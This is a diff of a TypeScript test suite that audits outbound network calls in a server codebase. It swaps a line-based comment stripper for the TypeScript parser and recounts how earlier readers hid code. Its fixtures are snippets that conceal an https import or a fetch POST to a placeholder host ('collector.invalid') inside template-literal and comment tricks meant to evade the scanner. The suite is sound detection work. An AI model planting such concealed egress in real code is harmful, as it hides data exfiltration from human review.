@@ -92,24 +92,24 @@
 //   6. THE DASHBOARD. `packages/dashboard` is a different package and not in this graph. The
 //      card's own posting path is censused from the other side in
 //      `gateway/routes/__tests__/only-the-card-can-post-a-report.test.ts`.
-//   7. A TRAILING COMMENT — `const x = 1; // import https from 'node:https'` — counts as an
-//      edge, because the stripper deliberately does not try to find a `//` inside a line
-//      (a URL holds two slashes and a string can hold anything). A block comment that OPENS
-//      mid-line is likewise not detected. Both are OVER-reads: they can only ADD a module to
-//      a manifest, never remove one, so they fail safe.
-//      ⚠ THIS ROW HAS BEEN WRONG TWICE, IN THE DANGEROUS DIRECTION, AND BOTH ARE WORTH THE
-//      LINES. (a) It once said "comments fail safe" about comment handling IN GENERAL, while
-//      the reader was a line-start classifier that dropped the WHOLE line: review's g1
-//      (`/* keep */ import https from 'node:https';`) and g2 (a namespace import wrapped onto
-//      a `*`-leading second line) were CODE DELETED BEFORE THE READER SAW IT, green at
-//      157/157 with a live POST in a blessed module. (b) The fix for (a) blanked every line
-//      until the next `*/`, so a line-start `/*` INSIDE A TEMPLATE LITERAL swallowed the real
-//      code after the template — re-review's h3, green at 164/164, on bytes where the reader
-//      it replaced scored `['node:https']`. Both are closed and both are pinned by fixtures
-//      (h3 asks whether CODE survived, which is the question the first five rows did not ask).
-//      The residue is bounded and stated in `stripComments`: a `*`-leading line of real code
-//      immediately inside an UNTERMINATED block comment would still be dropped, which cannot
-//      occur in a module that compiles.
+//   7. ⚠ THIS ROW IS NOW EMPTY, AND THE THREE THINGS IT USED TO SAY ARE WHY THE READER IS THE
+//      COMPILER'S. Comment handling was a cannot-see row three times running, and all three
+//      times the row understated it — the readers did not merely leave comment text in place
+//      (an over-read, safe), they DELETED REAL CODE (an under-read: a live POST riding green):
+//        (a) a line-start classifier dropping whole lines — g1 `/* keep */ import https from
+//            'node:https';` and g2 (a namespace import wrapped onto a `*`-leading line): green
+//            at 157/157 with a POST in a blessed feature module;
+//        (b) its fix, a span to the next `*/` — h3, a template holding pasteable prose: green
+//            at 164/164, where (a) had scored `['node:https']`;
+//        (c) its fix, a run ending at the first non-continuation line — X1/X2/X6/X8, where any
+//            `*/` on any line (a trailing block comment, a glob) still closed the run early:
+//            green at 167/167, COMPILING. Plus X4 and Y1, missed by all three.
+//      `stripComments` now blanks the comment ranges the TypeScript parser reports and nothing
+//      else, so text inside a template literal — which is one token to a parser — can never be
+//      removed. Every one of (a), (b), (c), X4 and Y1 is pinned by a fixture row that asks
+//      whether CODE SURVIVED. The reader's only remaining error mode is MISSING a comment,
+//      which leaves comment text in the source and can only ADD a name to a manifest; see the
+//      structural argument at `stripComments`. A string-built specifier is still row 1's.
 //   8. RUNTIME REACHABILITY. The walk over-approximates deliberately (an erased `import type`
 //      is counted), so a module here may not be reachable when the process runs. Same
 //      direction as the sibling census's prong C, and for the same reason: a type-only edge
@@ -136,6 +136,9 @@
 import { describe, it, expect } from 'vitest';
 import fs from 'node:fs';
 import path from 'node:path';
+// The comment reader is the compiler's own — see `stripComments`. `typescript` is already a
+// dependency of this package and this import is read-only parsing, never module execution.
+import ts from 'typescript';
 
 const SRC = path.resolve(__dirname, '..', '..');
 
@@ -333,78 +336,98 @@ const FEATURE_MODULES_NOT_REACHABLE: readonly string[] = [];
 // which is exactly the defect N3 records.
 const SPEC = /(?:\bfrom\s*|\bimport\s*\(\s*|\brequire\s*\(\s*|\bimport\s*)(['"`])([^'"`\n]+)\1/g;
 
-// ⚠ THE COMMENT STRIPPER IS **NOT** COPIED FROM THE SIBLING, AND REVIEW IS WHY (C1).
+/** Parsing is ~2.5ms a file and the census reads each module several times over. */
+const STRIP_CACHE = new Map<string, string>();
+
+// ⚠ THE COMMENT STRIPPER IS THE TYPESCRIPT COMPILER'S OWN, AND THREE ROUNDS OF REVIEW ARE WHY.
 //
-// The sibling's reader — and the first cut of this file — classified a LINE:
+// This file has now had FOUR comment readers. The first three were hand-written rules, and every
+// one of them DELETED REAL CODE — each in a shape its author had not imagined, and twice while a
+// sentence three lines above it promised that could not happen:
 //
-//   const isComment = (line) => /^\s*(\/\/|\*|\/\*)/.test(line);   // DROPS THE WHOLE LINE
+//   (1) THE LINE-START CLASSIFIER, copied from the sibling census on the argument that a reader
+//       with four rounds of review behind it should not be re-invented. It classified a LINE and
+//       the caller dropped the whole line, so one comment token in front of real code deleted the
+//       code: `/* keep */ import https from 'node:https';` (g1) and a namespace import wrapped
+//       onto a `*`-leading second line (g2) were both invisible, green at 157/157 with a live
+//       `https.request({ method: 'POST' })` inside a blessed feature module.
+//   (2) THE SPAN. Fixing (1), a line-start `/*` opened a span that blanked every line until the
+//       next `*/` — and a line-start `/*` INSIDE A TEMPLATE LITERAL opens one just as readily as
+//       a comment does. A `WINDOW_HELP` template holding pasteable prose, then
+//       `require('node:https')` and a POST: green at 164/164, on bytes where (1) scored
+//       `['node:https']`. The fix for (1) had reopened (1)'s own shape through another door.
+//   (3) THE RUN. Fixing (2) by ending the span at the first non-continuation line. But the `*/`
+//       test ran BEFORE the continuation test, so while a run was open ANY line carrying a `*/`
+//       anywhere — a trailing `/* … */`, a glob `'**/*.log'` — had everything before it
+//       discarded. Review's X1: a `/*`-leading template content line that also closes the
+//       template, then `import https from 'node:https'; /* the node client */` and a POST. It
+//       COMPILES and it was green at 167/167 across all three censuses. Two further shapes (X4,
+//       Y1) were missed by all three readers, and both compile.
 //
-// A line-start classifier that discards the whole line DELETES CODE, and two perfectly legal
-// shapes are code it deletes:
+// The lesson is not "write a better rule". JavaScript comment boundaries depend on string,
+// template and regex state, so ANY line-shaped rule is a lexer with most of the lexer missing —
+// and the cost of a wrong one here is not noise, it is a POST that rides green. So the fourth
+// reader is not a rule at all: it asks the TypeScript compiler, which is already a dependency of
+// this package and already parses every one of these files on `npm run typecheck`.
 //
-//   (g1)  `/* keep */ import https from 'node:https';`    one token in front of a real import
-//   (g2)  `import`  ⏎  `* as https from 'node:https';`    a namespace import, split over two
-//                                                         lines, second line begins with `*`
+// HOW IT WORKS: parse the text, then BLANK the comment ranges the compiler reports — spaces for
+// the comment's own characters, newlines left in place so line numbers survive. Nothing else is
+// touched; every non-comment byte is passed through.
 //
-// Both were planted inside `report/window.ts` — a blessed one-hop import of the handler — with
-// a live `https.request({ method: 'POST' })`, and both rode ALL THREE censuses GREEN at
-// 157/157. In a census whose entire promise is that the SPELLING stops mattering, a reader
-// that throws away code because of the first two characters on a line is the defect, not a
-// detail. (The header's "comments fail safe" row was true only of a TRAILING comment; it is
-// rewritten as row 7.)
+// ⚠ WHY THIS CANNOT DELETE CODE, AS A STRUCTURAL ARGUMENT RATHER THAN A FIXTURE COUNT — which is
+// what the three readers before it never had. The only positions blanked are the ones
+// `ts.getLeadingCommentRanges` / `ts.getTrailingCommentRanges` return, and those functions report
+// COMMENT RANGES ONLY: they are the compiler's own trivia scanner, the same one that decides what
+// `tsc` ignores. A template literal is a single token to the parser, so text inside one is never
+// trivia and is never blanked — that is X1, X4 and Y1 closed by construction, not by a rule that
+// happens to cover them. The one way this reader can still be WRONG is by MISSING a comment (if
+// the traversal below failed to visit some token's trivia), and a missed comment leaves comment
+// text in the source, which can only ADD a module to a manifest. **Every possible error of this
+// reader is an OVER-read.** That sentence has been false twice in this file; it is now a property
+// of where the ranges come from.
 //
-// SO THIS STRIPPER REMOVES COMMENT **TEXT**, NEVER A LINE OF CODE, and it tracks state:
+// MEASURED BEFORE IT WAS ADOPTED, over all 1,126 `.ts`/`.tsx` files of `packages/server/src` and
+// `packages/shared/src`: the walk is UNCHANGED (closure 582, unresolved 0, egress 34, shell 3,
+// feature 44, the two audited doors, five packages), and the only per-file difference anywhere in
+// the tree is that `agent/model.ts` loses one PHANTOM specifier (`'tools'`, from inside a trailing
+// comment) and NO file gains an edge. Strictly fewer phantoms, nothing new hidden. The reviewer's
+// prescribed two-line patch (move the `*/` test inside the continuation branch) was prototyped and
+// measured too: it also has zero churn and it closes X1/X2/X6/X8 — but it leaves X4 and Y1 open,
+// and both compile. This closes all six.
 //
-//   · a line whose first non-space characters are `//`  → the line's content goes;
-//   · a `/*` at the start of a line opens a RUN: that line goes, and when the `*/` arrives,
-//     WHATEVER FOLLOWS IT ON THAT LINE IS KEPT — which is exactly what g1 needs;
-//   · while a run is open, only `*`-LEADING lines are dropped — the JSDoc continuation
-//     shape. The FIRST line that is neither `*`-leading nor a close ENDS THE RUN AND IS
-//     KEPT. Nothing else is treated as a comment, so g2's `* as https from …` survives
-//     (no run is open there).
-//
-// ⚠ THAT LAST RULE IS FIX ROUND 2, AND IT IS WHY THE RUN IS NOT A PLAIN SPAN (re-review NB1).
-// Round 1 blanked every line until the next `*/`, and a line-start `/*` INSIDE A STRING opens
-// one just as readily as a real comment does — a multi-line template whose content line begins
-// `/* …` is ordinary in a tree that stores prose and pasteable code samples. Measured in
-// `report/window.ts`: a `WINDOW_HELP` template with such a line, followed by
-// `require('node:https')` and a POST, rode all three censuses GREEN at 164/164 — while the OLD
-// line-start classifier yields `['node:https']` on the same bytes. The fix for C1 had re-opened
-// C1's own shape through a different door, and three lines of prose above it claimed it could
-// not. Ending the run at the first non-continuation line closes it: the template's closing
-// backtick line ends the run, and the code after it is read.
-//
-// WHY A LINE START, AND WHAT IS LEFT. A `/*` appears inside ordinary strings (`'**/*.ts'` is a
-// glob), so an "anywhere" rule would swallow the code after a glob. With the run bounded at
-// both ends, EVERY remaining mistake is an OVER-read — a mid-line `/*` or a trailing `//`
-// leaves comment text in the source, which can only ADD a module to a manifest — with ONE
-// bounded exception, stated rather than claimed away: a `*`-leading line of real code
-// immediately inside an unterminated block comment would still be dropped. That cannot happen
-// in a module that compiles (an unterminated block comment is a syntax error, and `npm run
-// typecheck` runs over this tree), and inside a string a `*`-leading line is string content
-// and not an edge. Both directions are pinned by fixtures below, including the under-read one.
+// COST: ~2.5ms per file against ~0.07ms for a line rule, so the strip is memoised by source text
+// and the whole census runs in a couple of seconds rather than 200ms. That is the right trade for
+// the one reader every clause in this file rests on.
 function stripComments(code: string): string {
-  const out: string[] = [];
-  let inRun = false;
-  for (const line of code.split('\n')) {
-    const lead = line.trimStart();
-    if (inRun) {
-      const close = line.indexOf('*/');
-      if (close !== -1) { inRun = false; out.push(line.slice(close + 2)); continue; }
-      if (lead.startsWith('*')) { out.push(''); continue; }   // a JSDoc continuation line
-      inRun = false; out.push(line); continue;                // NOT a continuation: keep it
+  const cached = STRIP_CACHE.get(code);
+  if (cached !== undefined) return cached;
+  const source = ts.createSourceFile('census.ts', code, ts.ScriptTarget.Latest, false, ts.ScriptKind.TS);
+  const chars = code.split('');
+  const blanked = new Set<string>();
+  const blank = (range: ts.CommentRange): void => {
+    const key = `${range.pos}:${range.end}`;
+    if (blanked.has(key)) return;
+    blanked.add(key);
+    for (let i = range.pos; i < range.end && i < chars.length; i += 1) {
+      if (chars[i] !== '\n' && chars[i] !== '\r') chars[i] = ' ';
     }
-    if (lead.startsWith('//')) { out.push(''); continue; }
-    if (lead.startsWith('/*')) {
-      const open = line.indexOf('/*');
-      const close = line.indexOf('*/', open + 2);
-      if (close === -1) { inRun = true; out.push(''); continue; }
-      out.push(line.slice(close + 2));          // a one-line block comment in front of code
-      continue;
-    }
-    out.push(line);
-  }
-  return out.join('\n');
+  };
+  // Every comment in a file is trivia attached to some token, so visiting both ends of every
+  // node reaches all of it; the end-of-file token carries a trailing comment at the file's end.
+  const triviaAt = (pos: number): void => {
+    ts.getLeadingCommentRanges(code, pos)?.forEach(blank);
+    ts.getTrailingCommentRanges(code, pos)?.forEach(blank);
+  };
+  const visit = (node: ts.Node): void => {
+    triviaAt(node.pos);
+    triviaAt(node.end);
+    ts.forEachChild(node, visit);
+  };
+  visit(source);
+  triviaAt(source.endOfFileToken.pos);
+  const stripped = chars.join('');
+  STRIP_CACHE.set(code, stripped);
+  return stripped;
 }
 
 /** Every module specifier in a piece of code, in any spelling that creates an EDGE. */
@@ -519,14 +542,16 @@ describe('the specifier reader sees every import spelling that creates an edge',
     expect(specifiersIn(`// an old \`await import('node:https')\` hack\nconst x = 1;`)).toEqual([]);
   });
 
-  // ── THE COMMENT STRIPPER'S OWN VOCABULARY (review C1, re-review NB1) ─────────────────
-  // SEVEN rows, and they are two Criticals' worth of history. The old line-start classifier
-  // DELETED CODE (g1, g2); round 1's span stripper fixed those and DELETED CODE AGAIN through
-  // a `/*` inside a template literal (h3, h2) while asserting three lines above itself that
-  // it could not. So the table pins BOTH directions explicitly: four rows where text must
-  // survive the stripper, three where comment text must not. They are specifier-reader and
-  // egress-reader rows rather than census rows on purpose — the defect was upstream of the
-  // vocabulary both times, so it is pinned where the text is read.
+  // ── THE COMMENT STRIPPER'S OWN VOCABULARY (review C1, re-reviews 1 and 2) ───────────
+  // Three Criticals' worth of history, and the table is deliberately lopsided. Most of the
+  // rows below ask "DID CODE SURVIVE?" — the under-read direction, the one that HIDES a way
+  // out — because that is the direction every hand-written reader this file had got wrong:
+  // the line-start classifier on g1/g2, the span on h3/h2, the run on X1/X2/X6/X8, and X4/Y1
+  // on all three. A handful ask the opposite ("did comment text get removed?"), which is the
+  // safe direction and needs only a control. No count is stated on purpose: a number in a
+  // comment beside a growing table is a nit waiting to happen, and twice has been. They are
+  // specifier-reader and egress-reader rows rather than census rows because the defect was
+  // upstream of the vocabulary all three times, so it is pinned where the text is read.
   it('KEEPS an import that sits behind a one-line block comment (g1)', () => {
     // `/* keep */ import https from 'node:https';` — one token in front of real code. The old
     // reader dropped the whole line and the import vanished before the vocabulary saw it.
@@ -556,11 +581,76 @@ describe('the specifier reader sees every import spelling that creates an edge',
       .toEqual(['node:https']);
   });
 
-  it('a trailing comment is still an over-read, and that is the safe direction', () => {
-    // Row 7 of the header, as a clause: the stripper does not hunt for `//` inside a line, so
-    // this counts as an edge. It can only ADD a name to a manifest.
-    expect(specifiersIn(`const x = 1; // import https from 'node:https';`))
-      .toEqual(['node:https']);
+  it('drops a TRAILING comment too — the over-read the line rules all had is gone', () => {
+    // Every line-shaped reader this file has had treated this as an edge, because none of them
+    // would hunt for a `//` inside a line (a URL holds two slashes; a string can hold
+    // anything). The compiler knows. One phantom specifier disappeared from the real tree with
+    // this change — `'tools'` inside a trailing comment in `agent/model.ts` — and no file
+    // anywhere gained an edge.
+    expect(specifiersIn(`const x = 1; // import https from 'node:https';`)).toEqual([]);
+  });
+
+  it('...and a trailing BLOCK comment, the other half of the same class', () => {
+    expect(specifiersIn(`const x = 1; /* import https from 'node:https'; */`)).toEqual([]);
+  });
+
+  // ── THE SHAPES THAT RODE GREEN WHILE A READER CLAIMED THEY COULD NOT (re-review 2) ────
+  // All six COMPILE, all six hid a POST, and the line-shaped readers caught between zero and
+  // four of them. They are the reason this file asks the compiler instead: every one of them is
+  // text inside a template literal, which is ONE TOKEN to a parser and can never be trivia.
+  const X_SHAPES: readonly [string, string][] = [
+    ['X1 — a `/*` content line that also CLOSES the template, then code with a trailing block comment', [
+      'export const WINDOW_HELP = `',
+      '/* a block an agent may paste when it asks for a wider window`;',
+      "import https from 'node:https'; /* the node client */",
+      "const send = async (b: string) => { https.request({ host: 'collector.invalid', method: 'POST' }).end(b); };",
+    ].join('\n')],
+    ['X2 — the same, with a glob supplying the `*/`', [
+      'export const T = `',
+      '/* prose`;',
+      "import https from 'node:https'; const g = '**/*.log';",
+    ].join('\n')],
+    ['X4 — a `/*` template close, `import` on that line, the specifier on a `*`-leading line', [
+      'export const T = `',
+      '/* prose`; import',
+      "  * as https from 'node:https';",
+    ].join('\n')],
+    ['X6 — a `*`-leading template body whose close line carries the edge', [
+      'export const T = `',
+      '* a starred line',
+      '*/ `;',
+      "import https from 'node:https'; /* x */",
+    ].join('\n')],
+    ['Y1 — a `//` content line whose close carries the edge', [
+      'export const T = `',
+      "// paste this block`; import https from 'node:https';",
+    ].join('\n')],
+    ['(ii) — a REAL block comment whose close line carries the edge', [
+      '/* a block',
+      ' * body',
+      "*/ import https from 'node:https';",
+    ].join('\n')],
+  ];
+
+  for (const [label, code] of X_SHAPES) {
+    it(`sees the edge in ${label}`, () => {
+      expect(
+        specifiersIn(code),
+        `the reader lost a real import in this shape. Every line-shaped reader this file has had `
+        + 'deleted code in some shape like this one, and a deleted import is a POST that rides '
+        + 'the census green — the direction that HIDES a way out rather than inventing one.',
+      ).toEqual(['node:https']);
+    });
+  }
+
+  it('and the egress reader sees the POST in the X1 shape (X8)', () => {
+    const x8 = [
+      'export const T = `',
+      '/* prose`;',
+      "await fetch('https://collector.invalid/ingest', { method: 'POST' }); /* go */",
+    ].join('\n');
+    expect(egressMarkersIn(x8), 'the POST after the template was deleted as comment text')
+      .toContain('fetch(');
   });
 
   // ── THE UNDER-READ DIRECTION, WHICH IS THE ONE THAT HIDES A POST (re-review NB1) ──────
@@ -922,10 +1012,15 @@ describe('E4 — the walk\'s scope is declared, so an unwired module is not a si
     ).toEqual([...FEATURE_MODULES_NOT_REACHABLE].sort());
   });
 
-  // ── E4b: THE SAME PROPERTY FOR THE SHARED PACKAGE (re-review NB2) ────────────────────
-  // I5 made the walk follow `@dojo/shared`, which covers everything reachable from the BARREL
-  // — a narrower claim than "everything under packages/shared/src", and the difference was
-  // green and undeclared: a `shared/src/wire.ts` with a POST, not exported from `index.ts`.
+});
+
+// ── E4b: THE SAME PROPERTY FOR THE SHARED PACKAGE (re-review NB2) ──────────────────────
+// I5 made the walk follow `@dojo/shared`, which covers everything reachable from the BARREL —
+// a narrower claim than "everything under packages/shared/src", and the difference was green
+// and undeclared: a `shared/src/wire.ts` with a POST, not exported from `index.ts`. Its own
+// `describe` rather than a clause tucked under E4's, because it is a different directory with a
+// different reachability rule (a barrel export, not an import from the handler).
+describe('E4b — the shared package is in scope, so an unexported module must declare itself', () => {
   it('every production module in the shared package is reachable from its barrel', () => {
     const sharedSrc = path.resolve(SRC, '..', '..', 'shared', 'src');
     const onDisk = featureFilesOnDisk(sharedSrc).sort();
